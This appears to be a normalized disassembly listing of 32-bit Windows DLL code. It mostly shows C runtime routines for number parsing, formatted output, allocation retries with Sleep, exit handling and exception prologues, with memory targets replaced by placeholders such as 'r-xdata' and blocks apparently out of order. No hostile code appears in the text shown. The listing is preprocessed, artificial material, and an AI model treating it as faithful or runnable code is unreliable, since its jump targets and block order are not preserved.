push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_10018560
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_10018eac
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp ax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
dec edi
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
inc edi
inc edi
movzx esi [ edi ]
inc edi
inc edi
cmp ax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_100169a0
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1000e8db
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_10018eac
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
inc edi
inc edi
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_10010d7a
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10010ac6
add esp 0x14
pop ebp
retn
sub_10010da5
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_10019087
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_10010dd4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_10010da5
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_10010dfb
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebx ]
dec [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10010da5
inc ebx
inc ebx
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_1000e8db
cmp [ eax ] 0x2a
jne r-xdata
push 0x3f
mov eax edi
call sub_10010da5
pop ecx
sub_10010e4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] edi
mov [ ebp - 0x408 ] edi
mov [ ebp - 0x42c ] edi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] edi
mov [ ebp - 0x43c ] edi
mov [ ebp - 0x428 ] edi
call sub_1000afe5
cmp [ ebp - 0x430 ] edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_1000e8db
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x414 ] edi
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x418 ] edx
cmp dx di
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop edi
add esi edi
cmp [ ebp - 0x420 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov eax [ ebp - 0x420 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x418 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_100119c5 ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov ebx [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x430 ]
push edx
lea esi [ ebp - 0x420 ]
mov [ ebp - 0x428 ] 0x1
call sub_10010da5
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] edi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x42c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x42c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x42c ] ebx
test ebx ebx
jge r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x40c ] ebx
test ebx ebx
jge r-xdata
movzx eax [ esi ]
cmp ax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x42c ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp ax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
cmp ax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax edi
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
add ebx 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp ax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi edi
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x418 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x10
je r-xdata
cmp [ ebp - 0x43c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] ecx
jmp r-xdata
sub eax edi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp ax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x448 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x448 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] edi
jmp r-xdata
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea esi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] esi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x41c ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x418 ] edx
sub eax edi
je r-xdata
cmp ax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x444 ]
call sub_1000bf59
and [ ebp - 0x444 ] 0x0
mov ebx [ ebp - 0x42c ]
mov esi [ ebp - 0x414 ]
sub ebx esi
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax edi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax edi
je r-xdata
cmp ax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
lea ecx [ ebp - 0x438 ]
call sub_10010dfb
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_10010dd4
add esp 0xc
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebx ]
add ebx 0x8
mov [ ebp - 0x46c ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x41c ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push esi
push eax
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
call sub_1001836d
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax edi
jne r-xdata
cmp ax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_1001850c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x418 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1000e8db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10018d7b
add esp 0x10
test eax eax
jge r-xdata
and [ ebp - 0x45c ] 0x0
inc eax
inc eax
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
mov ecx [ ebp - 0x410 ]
push esi
lea eax [ ebp - 0x420 ]
call sub_10010dfb
pop ecx
test esi esi
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x420 ]
call sub_10010dd4
add esp 0xc
push 0x20
mov edi [ ebp - 0x40c ]
add edi 0x15d
push edi
call sub_100119e5
mov edx [ ebp - 0x418 ]
pop ecx
mov [ ebp - 0x444 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
pop ecx
pop ecx
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x44c ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
mov [ esi ] eax
mov ax [ ebp - 0x420 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x43c ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] edi
mov esi eax
jmp r-xdata
push esi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc esi
mov [ ebp - 0x410 ] esi
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x43c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x418 ]
cdq
push edx
push eax
push ebx
push edi
call sub_10018560
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_10010dd4
add esp 0xc
or [ ebp - 0x420 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x430 ]
lea esi [ ebp - 0x420 ]
call sub_10010da5
add edi [ ebp - 0x470 ]
cmp [ ebp - 0x418 ] 0x0
pop ecx
jg r-xdata
call sub_1000b9b0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x448 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
cmp [ ebp - 0x420 ] 0x0
jl r-xdata
dec [ ebp - 0x418 ]
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
call sub_10018d7b
add esp 0x10
mov [ ebp - 0x470 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_100119e5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1000c036
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_10011a2a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001920e
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10011a76
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001932c
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10011ac4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019547
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10011b16
push 0x10
push r--data
call sub_10011ecc
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1000e8db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10012a31
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_10011f11
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011bb0
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_10011bb9
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_10011be9
mov edi edi
push ebp
mov ebp esp
call sub_100136a0
push [ ebp + 0x8 ]
call sub_100134f5
push [ rw-data ]
call sub_1000e0ba
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_10011c12
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10011c67
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_10011c84
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10011ca8
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1001834c
push r--data
push r--data
call sub_10011c84
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_100125a0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_100172bb
call sub_1000b5e1
mov eax r--data
mov [ esp ] r--data
call sub_10011c67
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_100125a0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10011d2d
push 0x18
push r--data
call sub_10011ecc
push 0x8
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011e44
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10011f11
retn
mov [ rw-data ] ebx
push 0x8
call sub_10012924
pop ecx
push [ ebp + 0x8 ]
call sub_10011c3d
push r--data
mov eax r--data
call sub_10011c67
pop ecx
push [ rw-data ]
call sub_1000e0ba
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_10011c67
pop ecx
push [ rw-data ]
call sub_1000e0ba
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_1000e0b1
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_1000e0ba
mov edi eax
call sub_1000e0b1
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_1000e0ba
mov edi eax
push [ rw-data ]
call sub_1000e0ba
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_10011e7e
mov edi edi
push esi
call sub_1000e0b1
mov esi eax
push esi
call sub_100122b3
push esi
call sub_10019a06
push esi
call sub_1000e73c
push esi
call sub_100199f7
push esi
call sub_10019869
push esi
call sub_10019657
push esi
call sub_1001265d
push esi
call sub_10019646
push sub_10011e59
call sub_1000e03f
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_10011ecc
push sub_10011f30
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10011f30
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
